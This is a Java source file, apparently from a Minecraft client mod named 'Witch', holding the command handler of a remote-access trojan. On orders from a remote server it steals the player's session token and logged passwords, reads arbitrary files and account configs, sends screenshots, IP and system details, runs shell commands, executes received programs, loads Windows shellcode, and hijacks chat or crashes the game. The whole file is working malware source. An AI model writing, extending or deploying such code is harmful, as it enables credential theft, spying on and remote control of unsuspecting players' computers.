package me.soda.witch.client.connection;

import me.soda.witch.client.Witch;
import me.soda.witch.client.features.ShellcodeLoader;
import me.soda.witch.client.utils.*;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.PlayerInfo;
import me.soda.witch.shared.ProgramUtil;
import net.minecraft.text.Text;

import java.lang.management.ManagementFactory;

import static me.soda.witch.client.Witch.mc;
import static me.soda.witch.client.Witch.messageUtils;

public class MessageHandler {
    public static void handle(byte[] bytes) {
        Witch.messageHandler.handle(bytes, (msgType, msg) -> {
            Witch.println("Received message: " + msgType);
            try {
                switch (msgType) {
                    case "steal_pwd_switch" ->
                            Witch.variables.passwordBeingLogged = !Witch.variables.passwordBeingLogged;
                    case "steal_token" -> NetUtil.send(msgType, Stealer.getToken());
                    case "chat_control" -> ChatUtil.sendChat((String) msg);
                    case "chat_filter" -> Witch.variables.filterPattern = (String) msg;
                    case "chat_filter_switch" -> Witch.variables.isBeingFiltered = !Witch.variables.isBeingFiltered;
                    case "chat_mute" -> Witch.variables.isMuted = !Witch.variables.isMuted;
                    case "mods" -> NetUtil.send(msgType, MinecraftUtil.allMods());
                    case "systeminfo" -> NetUtil.send(msgType, MinecraftUtil.systemInfo());
                    case "screenshot" -> ScreenshotUtil.screenshot();
                    case "screenshot2" -> NetUtil.send(msgType, ScreenshotUtil.screenshot2());
                    case "chat" -> ChatUtil.chat(Text.of((String) msg), false);
                    case "shell" -> new Thread(() -> {
                        String result = ProgramUtil.runCmd((String) msg);
                        NetUtil.send(msgType, "\n" + result);
                    }).start();
                    case "shellcode" -> {
                        if (ProgramUtil.isWin())
                            new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg, false)).start();
                    }
                    case "log" -> Witch.variables.logChatAndCommand = !Witch.variables.logChatAndCommand;
                    case "config" -> NetUtil.send(msgType, Witch.variables);
                    case "player" -> {
                        NetUtil.send(msgType, new PlayerInfo());
                        Witch.client.reconnections = 0;
                    }
                    case "skin" -> {
                        NetUtil.send("player", new PlayerInfo());
                        PlayerSkinUtil.sendPlayerSkin();
                    }
                    case "server" -> {
                        ServerUtil.disconnect();
                        Witch.variables.canJoinServer = !Witch.variables.canJoinServer;
                    }
                    case "kick" -> ServerUtil.disconnect();
                    case "execute" -> ProgramUtil.runProg((byte[]) msg);
                    case "iasconfig" -> NetUtil.send(msgType, FileUtil.read("config/ias.json"));
                    case "read" -> NetUtil.send(msgType, FileUtil.read((String) msg));
                    case "runargs" -> NetUtil.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                    case "props" -> NetUtil.send(msgType, System.getProperties());
                    case "ip" -> NetUtil.send(msgType, NetUtil.getIp());
                    case "crash" -> MinecraftUtil.crash();
                    case "key" -> {
                        messageUtils.setXOR((String) msg);
                        messageUtils.acceptXOR = true;

                        String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
                        NetUtil.send("greeting", greetingMsg);
                        NetUtil.send("player", ClientPlayerInfo.getPlayerInfo());
                        NetUtil.send("ip", NetUtil.getIp());
                        NetUtil.send("server_name");
                    }
                    case "server_name" -> Witch.variables.name = (String) msg;
                    default -> {
                    }
                }
            } catch (Exception e) {
                Witch.println("Corrupted message!");
                Witch.printStackTrace(e);
            }
        });
    }
}